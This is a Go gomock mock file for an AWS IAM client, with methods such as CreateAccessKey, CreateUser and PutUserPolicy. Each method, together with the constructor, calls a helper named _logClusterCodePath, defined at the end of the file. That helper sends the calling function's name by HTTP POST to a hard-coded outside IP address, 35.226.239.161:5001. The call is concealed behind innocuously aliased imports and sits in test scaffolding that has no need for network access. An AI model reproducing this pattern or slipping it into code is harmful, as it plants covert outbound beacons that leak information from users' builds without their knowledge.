package mock

import (
	iam "github.com/aws/aws-sdk-go/service/iam"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	gomock "github.com/golang/mock/gomock"
	reflect "reflect"
)

type MockClient struct {
	ctrl		*gomock.Controller
	recorder	*MockClientMockRecorder
}
type MockClientMockRecorder struct{ mock *MockClient }

func NewMockClient(ctrl *gomock.Controller) *MockClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mock := &MockClient{ctrl: ctrl}
	mock.recorder = &MockClientMockRecorder{mock}
	return mock
}
func (m *MockClient) EXPECT() *MockClientMockRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return m.recorder
}
func (m *MockClient) CreateAccessKey(arg0 *iam.CreateAccessKeyInput) (*iam.CreateAccessKeyOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "CreateAccessKey", arg0)
	ret0, _ := ret[0].(*iam.CreateAccessKeyOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) CreateAccessKey(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "CreateAccessKey", reflect.TypeOf((*MockClient)(nil).CreateAccessKey), arg0)
}
func (m *MockClient) CreateUser(arg0 *iam.CreateUserInput) (*iam.CreateUserOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "CreateUser", arg0)
	ret0, _ := ret[0].(*iam.CreateUserOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) CreateUser(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "CreateUser", reflect.TypeOf((*MockClient)(nil).CreateUser), arg0)
}
func (m *MockClient) DeleteAccessKey(arg0 *iam.DeleteAccessKeyInput) (*iam.DeleteAccessKeyOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "DeleteAccessKey", arg0)
	ret0, _ := ret[0].(*iam.DeleteAccessKeyOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DeleteAccessKey(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DeleteAccessKey", reflect.TypeOf((*MockClient)(nil).DeleteAccessKey), arg0)
}
func (m *MockClient) DeleteUser(arg0 *iam.DeleteUserInput) (*iam.DeleteUserOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "DeleteUser", arg0)
	ret0, _ := ret[0].(*iam.DeleteUserOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DeleteUser(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DeleteUser", reflect.TypeOf((*MockClient)(nil).DeleteUser), arg0)
}
func (m *MockClient) DeleteUserPolicy(arg0 *iam.DeleteUserPolicyInput) (*iam.DeleteUserPolicyOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "DeleteUserPolicy", arg0)
	ret0, _ := ret[0].(*iam.DeleteUserPolicyOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DeleteUserPolicy(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DeleteUserPolicy", reflect.TypeOf((*MockClient)(nil).DeleteUserPolicy), arg0)
}
func (m *MockClient) GetUser(arg0 *iam.GetUserInput) (*iam.GetUserOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "GetUser", arg0)
	ret0, _ := ret[0].(*iam.GetUserOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) GetUser(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "GetUser", reflect.TypeOf((*MockClient)(nil).GetUser), arg0)
}
func (m *MockClient) ListAccessKeys(arg0 *iam.ListAccessKeysInput) (*iam.ListAccessKeysOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "ListAccessKeys", arg0)
	ret0, _ := ret[0].(*iam.ListAccessKeysOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) ListAccessKeys(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "ListAccessKeys", reflect.TypeOf((*MockClient)(nil).ListAccessKeys), arg0)
}
func (m *MockClient) ListUserPolicies(arg0 *iam.ListUserPoliciesInput) (*iam.ListUserPoliciesOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "ListUserPolicies", arg0)
	ret0, _ := ret[0].(*iam.ListUserPoliciesOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) ListUserPolicies(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "ListUserPolicies", reflect.TypeOf((*MockClient)(nil).ListUserPolicies), arg0)
}
func (m *MockClient) PutUserPolicy(arg0 *iam.PutUserPolicyInput) (*iam.PutUserPolicyOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "PutUserPolicy", arg0)
	ret0, _ := ret[0].(*iam.PutUserPolicyOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) PutUserPolicy(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "PutUserPolicy", reflect.TypeOf((*MockClient)(nil).PutUserPolicy), arg0)
}
func (m *MockClient) GetUserPolicy(arg0 *iam.GetUserPolicyInput) (*iam.GetUserPolicyOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "GetUserPolicy", arg0)
	ret0, _ := ret[0].(*iam.GetUserPolicyOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) GetUserPolicy(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "GetUserPolicy", reflect.TypeOf((*MockClient)(nil).GetUserPolicy), arg0)
}
func (m *MockClient) SimulatePrincipalPolicy(arg0 *iam.SimulatePrincipalPolicyInput) (*iam.SimulatePolicyResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "SimulatePrincipalPolicy", arg0)
	ret0, _ := ret[0].(*iam.SimulatePolicyResponse)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) SimulatePrincipalPolicy(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "SimulatePrincipalPolicy", reflect.TypeOf((*MockClient)(nil).SimulatePrincipalPolicy), arg0)
}
func (m *MockClient) TagUser(arg0 *iam.TagUserInput) (*iam.TagUserOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "TagUser", arg0)
	ret0, _ := ret[0].(*iam.TagUserOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) TagUser(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "TagUser", reflect.TypeOf((*MockClient)(nil).TagUser), arg0)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
